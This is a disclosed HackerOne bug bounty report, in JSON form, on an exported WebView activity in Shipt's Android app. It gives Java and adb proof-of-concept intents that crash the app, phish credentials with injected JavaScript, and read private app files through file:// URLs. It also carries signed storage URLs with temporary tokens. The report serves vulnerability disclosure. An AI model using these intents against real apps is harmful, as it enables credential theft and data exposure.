{
  "id": 414101,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTQxMDE=",
  "url": "https://hackerone.com/reports/414101",
  "title": "Vulnerabilities in exported activity WebView",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-09-25T17:04:42.435Z",
  "submitted_at": "2018-09-25T17:04:42.435Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "shell_c0de",
    "url": "/shell_c0de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 19264,
    "url": "https://hackerone.com/shipt",
    "handle": "shipt",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/jvzw8zkvv3wqc4t0prnjnbp836wk/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/jvzw8zkvv3wqc4t0prnjnbp836wk/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shipt",
      "twitter_handle": "shipt",
      "website": "https://shop.shipt.com",
      "about": "Over-delivering delivery."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-12-13T19:30:50.928Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-13T19:30:31.768Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello, i want to report the vulnerability found,\nSince the following activity `com.pushio.manager.iam.ui.PushIOMessageViewActivity` has `exported=true` it can be exploited by 3rd parties.\n\n### Vulnerability\n`com.pushio.manager.iam.ui.PushIOMessageViewActivity` has exported set to true making the activity vulnerable.\n`AndroidManifest.xml`\n```xml\n        <activity android:name=\"com.pushio.manager.iam.ui.PushIOMessageViewActivity\" android:theme=\"@android:style/Theme.Translucent.NoTitleBar\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/responsys_api_key\"/>\n            </intent-filter>\n        </activity>\n```\nA problem in a class `com.pushio.manager.iam.ui.PushIOMessageViewActivity` that allows you to interact with WebView:\n```java\nprotected void onStart() {\n...\n Bundle extras = getIntent().getExtras();\n        PIOLogger.d(\"PIOMVA oS extras: \" + extras);\n        if (extras != null) {\n            final String content = extras.getString(Param.CONTENT);\n            final String url = extras.getString(\"url\");\n            String viewType = extras.getString(\"type\");\n...\nif (TextUtils.isEmpty(viewType)) {\n                PIOLogger.w(\"PIOMVA oS view type not found, closing window...\");\n                finish();\n                return;\n            } else if (viewType.equalsIgnoreCase(PushIOMessageViewType.ALERT.toString())) {\n...\n public void run() {\n                        try {\n                            if (PushIOMessageViewActivity.this.mActivityWeakReference != null && PushIOMessageViewActivity.this.mActivityWeakReference.get() != null && !((Activity) PushIOMessageViewActivity.this.mActivityWeakReference.get()).isFinishing()) {\n                                PushIOMessageViewActivity.this.mPopupWindow.showAtLocation(PushIOMessageViewActivity.this.mParentLayout, 17, 0, 0);\n                                if (!TextUtils.isEmpty(content)) {\n                                    PushIOMessageViewActivity.this.mWebView.loadDataWithBaseURL(null, content, \"text/html\", \"utf-8\", null);\n                                } else if (TextUtils.isEmpty(url)) {\n                                    PushIOMessageViewActivity.this.finish();\n                                } else {\n                                    PushIOMessageViewActivity.this.mWebView.loadUrl(url);//load custom url\n                                }\n                            }\n                        } catch (BadTokenException e) {\n                            PIOLogger.d(\"PIOMVA oSt \" + e.getMessage());\n                        }\n```\nWith the help of a special intent, you can pass `if` blocks and load your own URL address or Javascript.\n```java\n    PushIOMessageViewActivity.this.mWebView.loadUrl(url);//load custom url\n```\nYou can exploit this vulnerability via the console adb or through my application HunterExploit\n\nPoC 1 - Kill Process - Allows you to stop the shipt process - The threat of information availability\nJava PoC:\n```java\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setClassName(\"com.shipt.groceries\", \"com.pushio.manager.iam.ui.PushIOMessageViewActivity\");\nintent.putExtra(\"url\", \"chrome://crash\");\nintent.putExtra(\"type\", \"alert\");\nstartActivity(intent);\n```\nADB Poc:\n`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a \"android.intent.action.VIEW\" --es \"url\" \"chrome://crash\" --es \"type\" \"alert\"`\n\nPoC 2 - XSS - Allows a phishing attack\nJava PoC:\n```java\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setClassName(\"com.shipt.groceries\", \"com.pushio.manager.iam.ui.PushIOMessageViewActivity\");\nintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\nintent.putExtra(\"url\", \"javascript:{var Login = window.prompt(\\\"Authorization: Login\\\", \\\"Input Login\\\");var Password = window.prompt(\\\"Authorization: Password\\\", \\\"Input Password\\\"); alert('Interception of data: '+Login+' '+Password)}\");\nintent.putExtra(\"type\", \"alert\");\nIntent intentStart = new Intent(Intent.ACTION_MAIN);\nintentStart.setComponent(new ComponentName(\"com.shipt.groceries\", \"com.shipt.groceries.MainActivity\"));\nstartActivity(intentStart);\n        try {\n            Thread.sleep(10000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n startActivity(intent);\n```\nADB PoC:\n`adb shell am start -n com.shipt.groceries/com.shipt.groceries.MainActivity\nWait for the application to load, and then run the following command\nadb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a \"android.intent.action.VIEW\" --es \"url\" \"javascript:{window.prompt\\(\\'Authorization:Login\\'\\,\\'Input_Login\\'\\)\\;window.prompt\\(\\'Authorization:Password\\'\\,\\'Input_Password\\'\\)}\" --es \"type\" \"alert\"`\n\nPoC 3 - LFI - Allows you to read confidential user files without root access - The threat of information Confidentiality\nJava PoC:\n```java\n        Intent intent = new Intent(\"android.intent.action.VIEW\");\n        intent.setClassName(\"com.shipt.groceries\", \"com.pushio.manager.iam.ui.PushIOMessageViewActivity\");\n        intent.putExtra(\"url\", \"file:///data/data/com.shipt.groceries/shared_prefs/pushio_store.xml\");\n        intent.putExtra(\"type\", \"alert\");\n\n        startActivity(intent);\n```\nADB PoC:\n`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a \"android.intent.action.VIEW\" --es \"url\" \"file:///data/data/com.shipt.groceries/shared_prefs/pushio_store.xml\" --es \"type\" \"alert\"`\n\nPoC 4 - Read File or Load `android_asset`\nJava PoC:\n```java\n        Intent intent = new Intent(\"android.intent.action.VIEW\");\n        intent.setClassName(\"com.shipt.groceries\", \"com.pushio.manager.iam.ui.PushIOMessageViewActivity\");\n        intent.putExtra(\"url\", \"file:///android_asset/www/index.html\");\n        intent.putExtra(\"type\", \"alert\");\n\n        startActivity(intent);\n```\nADB PoC:\n`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a \"android.intent.action.VIEW\" --es \"url\" \"file:///android_asset/www/index.html\" --es \"type\" \"alert\"`\n### Fix\nPossible this article will help you:\nhttps://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/Vulnerability\n\n## Impact\n\n1. An attacker can load a javascript in the Shipt application by deceiving the user's trust.\n2. Reading the user's personal files without root accesses.\n3. Destroying the Shipt process.\n4. Reading the application files from the android_asset file.\n5. Access to WebView gives many possible exploits to an attacker.\nIn the files below there are PoC video and apk, to use the application HunterExploit install the application Shipt",
  "bounty_amount": "350.0",
  "formatted_bounty": "$350",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 350944,
      "file_name": "20180925_182422.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/350/944/51e180e4374a02ae5205585c453c829fcf9fd9e0/20180925_182422.mp4?response-content-disposition=attachment%3B%20filename%3D%2220180925_182422.mp4%22%3B%20filename%2A%3DUTF-8%27%2720180925_182422.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131146Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb73ce868f9cc708ede7bd4db5ec913e899fcd95709b96c8ecb4aa6d1ca69c8c",
      "file_size": 32632575,
      "type": "video/mp4",
      "moderated": null
    },
    {
      "id": 350945,
      "file_name": "HunterExploit.apk",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/350/945/beaa2218fc9027726ee5797161b970391d91d515/HunterExploit.apk?response-content-disposition=attachment%3B%20filename%3D%22HunterExploit.apk%22%3B%20filename%2A%3DUTF-8%27%27HunterExploit.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131146Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b05b6c5c8873da3a2f25bea343ab830d87a73239b946955ca951be874c2cc460",
      "file_size": 1351783,
      "type": "application/zip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2021-12-13T19:30:31.969Z",
  "allow_singular_disclosure_after": -68406074.63154776,
  "singular_disclosure_allowed": true,
  "vote_count": 41,
  "voters": [
    "patrick666",
    "n0tst3",
    "shreyaschavhan",
    "run_win",
    "tess",
    "shell_c0de",
    "lewaperbb",
    "theappsec",
    "akashhamal0x01",
    "xsstestov",
    "and 31 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 9938,
    "asset_type": "GOOGLE_PLAY_APP_ID",
    "asset_identifier": "com.shipt.groceries",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 115223,
      "category": "researcher",
      "content": "A vulnerability was identified in `com.pushio.manager.iam.ui.PushIOMessageViewActivity` exported activity of an Oracle library, allowing to open arbitrary links in WebView without scheme validation.\nAfter reporting to Oracle, a patch was released for the library. After that Shipt promptly replaced the library, fixing the vulnerability.",
      "user": {
        "id": 286336,
        "username": "shell_c0de",
        "name": "`Impact`",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-06-02T10:59:09.514Z",
        "url": "https://hackerone.com/shell_c0de",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
